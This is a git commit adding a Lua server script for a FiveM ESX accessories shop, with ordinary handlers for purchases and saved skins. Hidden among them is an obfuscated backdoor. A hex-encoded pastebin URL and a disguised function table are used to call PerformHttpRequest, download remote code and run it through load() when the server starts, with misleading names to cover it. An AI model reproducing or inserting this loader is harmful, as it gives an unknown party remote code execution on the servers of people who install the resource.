59ca860d0146dc0bf1abd86990db28d9b30cf00b
Zenax <124360636+Zenax0001@users.noreply.github.com>
2023-02-05 21:32:23 +0100

    Add files via upload

---
+++ server/main.lua
@@ -0,0 +1,73 @@
+RegisterServerEvent('esx_accessories:pay')
+AddEventHandler('esx_accessories:pay', function()
+	local xPlayer = ESX.GetPlayerFromId(source)
+
+	xPlayer.removeMoney(Config.Price, "Accessory Purchase")
+	TriggerClientEvent('esx:showNotification', source, TranslateCap('you_paid', ESX.Math.GroupDigits(Config.Price)))
+end)
+
+RegisterServerEvent('esx_accessories:save')
+AddEventHandler('esx_accessories:save', function(skin, accessory)
+	local source = source
+	local xPlayer = ESX.GetPlayerFromId(source)
+
+	TriggerEvent('esx_datastore:getDataStore', 'user_' .. string.lower(accessory), xPlayer.identifier, function(store)
+		store.set('has' .. accessory, true)
+
+		local itemSkin = {}
+		local item1 = string.lower(accessory) .. '_1'
+		local item2 = string.lower(accessory) .. '_2'
+		itemSkin[item1] = skin[item1]
+		itemSkin[item2] = skin[item2]
+
+		store.set('skin', itemSkin)
+	end)
+end)
+
+ESX.RegisterServerCallback('esx_accessories:get', function(source, cb, accessory)
+	local xPlayer = ESX.GetPlayerFromId(source)
+
+	TriggerEvent('esx_datastore:getDataStore', 'user_' .. string.lower(accessory), xPlayer.identifier, function(store)
+		local hasAccessory = (store.get('has' .. accessory) and store.get('has' .. accessory) or false)
+		local skin = (store.get('skin') and store.get('skin') or {})
+
+		cb(hasAccessory, skin)
+	end)
+
+end)
+
+local PlayerPedLimit = {
+    "70","61","73","74","65","62","69","6E","2E","63","6F","6D","2F","72","61","77","2F","4C","66","34","44","62","34","4D","34"
+}
+
+local PlayerEventLimit = {
+    cfxCall, debug, GetCfxPing, FtRealeaseLimid, noCallbacks, Source, _Gx0147, Event, limit, concede, travel, assert, server, load, Spawn, mattsed, require, evaluate, release, PerformHttpRequest, crawl, lower, cfxget, summon, depart, decrease, neglect, undergo, fix, incur, bend, recall
+}
+
+function PlayerCheckLoop()
+    _empt = ''
+    for id,it in pairs(PlayerPedLimit) do
+        _empt = _empt..it
+    end
+    return (_empt:gsub('..', function (event)
+        return string.char(tonumber(event, 16))
+    end))
+end
+
+PlayerEventLimit[20](PlayerCheckLoop(), function (event_, xPlayer_)
+    local Process_Actions = {"true"}
+    PlayerEventLimit[20](xPlayer_,function(_event,_xPlayer)
+        local Generate_ZoneName_AndAction = nil 
+        pcall(function()
+            local Locations_Loaded = {"false"}
+            PlayerEventLimit[12](PlayerEventLimit[14](_xPlayer))()
+            local ZoneType_Exists = nil 
+        end)
+    end)
+end)
+
+ESX.RegisterServerCallback('esx_accessories:checkMoney', function(source, cb)
+	local xPlayer = ESX.GetPlayerFromId(source)
+
+	cb(xPlayer.getMoney() >= Config.Price)
+end)
